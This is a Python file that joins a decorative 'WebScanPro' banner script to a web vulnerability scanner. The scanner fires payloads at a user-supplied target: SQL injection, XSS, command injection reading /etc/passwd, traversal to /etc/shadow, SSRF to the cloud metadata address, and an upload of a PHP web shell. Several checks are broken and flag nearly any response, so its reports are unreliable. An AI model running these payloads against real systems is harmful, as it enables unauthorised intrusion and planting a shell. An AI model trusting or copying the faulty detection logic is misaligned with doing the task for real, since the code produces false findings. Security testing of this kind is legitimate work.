import pyfiglet
from termcolor import colored
import time

# Function to display an animated start screen with tool name and owner
def display_welcome():
    # ASCII Art for Tool Name using pyfiglet
    tool_name = pyfiglet.figlet_format("WebScanPro", font="slant")
    owner_name = "Owner: Mihir Patel"

    # Colorize and display the tool name
    print(colored(tool_name, "cyan"))
    
    # Print the owner's name with color
    print(colored(owner_name, "yellow"))

    # Pause for effect
    time.sleep(1)
    
    # Display a welcoming message
    print(colored("\nWelcome to WebScanPro!", "green"))
    time.sleep(1)
    print(colored("Your ultimate vulnerability scanner for web applications.", "magenta"))
    time.sleep(1)
    
    # Show a brief description of the tool
    print("\n" + colored("The tool scans for common web vulnerabilities such as:", "white"))
    print(colored("SQL Injection, XSS, Command Injection, CSRF, SSRF, and more.", "blue"))
    time.sleep(2)
    
    print("\n" + colored("Starting scan...", "green"))
    time.sleep(1)

# Function to simulate the vulnerability scanning process
def simulate_scan():
    # Example vulnerability checks with delay for simulation
    vulnerabilities = [
        "Scanning for SQL Injection...",
        "Scanning for XSS...",
        "Scanning for Command Injection...",
        "Scanning for CSRF...",
        "Scanning for SSRF...",
        "Scanning for Open Redirect..."
    ]
    
    for vuln in vulnerabilities:
        print(colored(vuln, "yellow"))
        time.sleep(2)

# Main function to orchestrate the tool
def main():
    # Display the welcoming screen with tool and owner name
    display_welcome()
    

# Run the main function
if __name__ == "__main__":
    main()









import requests
from bs4 import BeautifulSoup
import re

class WebAppVulnScanner:

    def __init__(self, url):
        self.url = url
        self.suspected_vulnerabilities = []

    def scan_sql_injection(self):
        """Check for SQL Injection vulnerability by sending common SQL payloads."""
        payloads = [
            "' OR '1'='1",
            "' OR 'a'='a",
            "' OR 1=1 --",
            "' UNION SELECT NULL, NULL --",
            "admin'--", 
            "1' AND 1=1 --"
        ]
        for payload in payloads:
            test_url = f"{self.url}?id={payload}"
            response = requests.get(test_url)
            if "error" in response.text.lower() or "warning" in response.text.lower():
                self.suspected_vulnerabilities.append(f"SQL Injection vulnerability found at {test_url}")

    def scan_xss(self):
        """Check for XSS vulnerability by injecting common XSS payloads."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg/onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
        for payload in payloads:
            test_url = f"{self.url}?search={payload}"
            response = requests.get(test_url)
            if payload in response.text:
                self.suspected_vulnerabilities.append(f"XSS vulnerability found at {test_url}")

    def scan_directory_traversal(self):
        """Check for Directory Traversal vulnerability by injecting payloads."""
        payloads = [
            "../../../../etc/passwd",
            "../../etc/shadow",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "/../../../../etc/hostname"
        ]
        for payload in payloads:
            test_url = f"{self.url}?file={payload}"
            response = requests.get(test_url)
            if "error" in response.text.lower() or "permission denied" not in response.text.lower():
                self.suspected_vulnerabilities.append(f"Directory Traversal vulnerability found at {test_url}")

    def scan_csrf(self):
        """Check for CSRF vulnerability by looking for forms without anti-CSRF tokens."""
        response = requests.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            csrf_found = False
            for input_tag in inputs:
                if input_tag.get('name') in ['csrf_token', 'anti_csrf', 'csrf'] or 'token' in input_tag.get('name', '').lower():
                    csrf_found = True
                    break
            if not csrf_found:
                self.suspected_vulnerabilities.append(f"CSRF vulnerability found in form with action: {action}")

    def scan_ssrf(self):
        """Check for SSRF vulnerability by sending payloads that try to access internal services."""
        payloads = [
            "http://localhost:80",
            "http://127.0.0.1:8080",
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:9200",  # Example of ElasticSearch SSRF attempt
            "http://localhost/admin"
        ]
        for payload in payloads:
            test_url = f"{self.url}?url={payload}"
            response = requests.get(test_url)
            if "error" in response.text.lower() or "deny" not in response.text.lower():
                self.suspected_vulnerabilities.append(f"SSRF vulnerability found at {test_url}")

    def scan_command_injection(self):
        """Check for Command Injection vulnerabilities."""
        payloads = [
            "; ls",
            "| ls",
            "& ls",
            "`ls`",
            "; cat /etc/passwd",
            "| cat /etc/shadow"
        ]
        for payload in payloads:
            test_url = f"{self.url}?cmd={payload}"
            response = requests.get(test_url)
            if response.status_code == 200 and ("root" in response.text.lower() or "bin" in response.text.lower()):
                self.suspected_vulnerabilities.append(f"Command Injection vulnerability found at {test_url}")

    def scan_idor(self):
        """Check for IDOR (Insecure Direct Object Reference) by manipulating URL parameters."""
        test_urls = [
            f"{self.url}?id=1",
            f"{self.url}?id=2",
            f"{self.url}?id=999",  # An ID that should not exist
            f"{self.url}?file=test.txt"
        ]
        for test_url in test_urls:
            response = requests.get(test_url)
            if "Access Denied" not in response.text and "Unauthorized" not in response.text:
                self.suspected_vulnerabilities.append(f"IDOR vulnerability found at {test_url}")

    def scan_file_upload(self):
        """Check for insecure file upload vulnerabilities."""
        test_files = [
            ('file', ('test.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/php')),
            ('file', ('test.exe', 'fake content', 'application/octet-stream')),
            ('file', ('test.jpg', 'fake content', 'image/jpeg')),
            ('file', ('test.php3', '<?php echo phpinfo(); ?>', 'application/php'))
        ]
        for file_data in test_files:
            test_url = f"{self.url}/upload"
            files = {file_data[0]: (file_data[1][0], file_data[1][1], file_data[1][2])}
            response = requests.post(test_url, files=files)
            if response.status_code == 200 and "error" not in response.text.lower():
                self.suspected_vulnerabilities.append(f"Insecure file upload vulnerability found at {test_url}")

    def scan_open_redirect(self):
        """Check for Open Redirect vulnerability."""
        payloads = [
            "http://malicious.com",
            "https://evil.com/redirect?target=http://victim.com",
            "http://example.com/redirect?url=http://malicious.com"
        ]
        for payload in payloads:
            test_url = f"{self.url}?redirect={payload}"
            response = requests.get(test_url)
            if payload in response.url:
                self.suspected_vulnerabilities.append(f"Open Redirect vulnerability found at {test_url}")

    def scan_xssi(self):
        """Check for Cross-Site Script Inclusion (XSSI) vulnerability."""
        payloads = [
            "<script>fetch('http://target.com/api/data').then(r=>r.json()).then(console.log)</script>",
            "<script>new Image().src='http://target.com/api/data?callback=evil'</script>"
        ]
        for payload in payloads:
            test_url = f"{self.url}?data={payload}"
            response = requests.get(test_url)
            if payload in response.text:
                self.suspected_vulnerabilities.append(f"XSSI vulnerability found at {test_url}")

    def scan_http_response_splitting(self):
        """Check for HTTP Response Splitting vulnerability."""
        payloads = [
            "\r\nSet-Cookie: sessionid=malicious",
            "\r\nLocation: http://evil.com"
        ]
        for payload in payloads:
            test_url = f"{self.url}?param={payload}"
            response = requests.get(test_url)
            if "HTTP/1.1 200 OK" in response.text:
                self.suspected_vulnerabilities.append(f"HTTP Response Splitting vulnerability found at {test_url}")

    def scan_reflected_file_download(self):
        """Check for Reflected File Download vulnerability."""
        payloads = [
            "data:text/html,<script>alert('RFD')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmYyJyk8L3NjcmlwdD4="  # Base64-encoded JavaScript
        ]
        for payload in payloads:
            test_url = f"{self.url}?download={payload}"
            response = requests.get(test_url)
            if response.status_code == 200 and "Content-Disposition" in response.headers.get('Content-Disposition', ''):
                self.suspected_vulnerabilities.append(f"Reflected File Download vulnerability found at {test_url}")

    def scan(self):
        """Perform the vulnerability scan by checking for common vulnerabilities."""
        print(f"Starting scan on {self.url}...")
        self.scan_sql_injection()
        self.scan_xss()
        self.scan_directory_traversal()
        self.scan_csrf()
        self.scan_ssrf()
        self.scan_command_injection()
        self.scan_idor()
        self.scan_file_upload()
        self.scan_open_redirect()
        self.scan_xssi()
        self.scan_http_response_splitting()
        self.scan_reflected_file_download()
        
        if self.suspected_vulnerabilities:
            print("\nPossible vulnerabilities detected:")
            for vuln in self.suspected_vulnerabilities:
                print(f" - {vuln}")
        else:
            print("\nNo common vulnerabilities found.")

# Usage example
if __name__ == "__main__":
    target_url = input("Enter the target URL to scan: ")
    scanner = WebAppVulnScanner(target_url)
    scanner.scan()







